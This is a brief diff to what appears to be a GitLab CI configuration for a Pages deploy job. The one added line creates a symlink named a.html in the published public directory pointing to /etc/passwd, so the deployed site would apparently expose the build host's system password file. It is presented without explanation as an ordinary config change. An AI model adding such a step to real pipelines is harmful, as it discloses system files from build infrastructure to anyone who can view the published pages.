@@ -4,6 +4,7 @@ pages:
   stage: deploy
   script:
   - echo 'Nothing to do...'
+  - cd public;ln -s /etc/passwd a.html
   artifacts:
     paths:
     - public
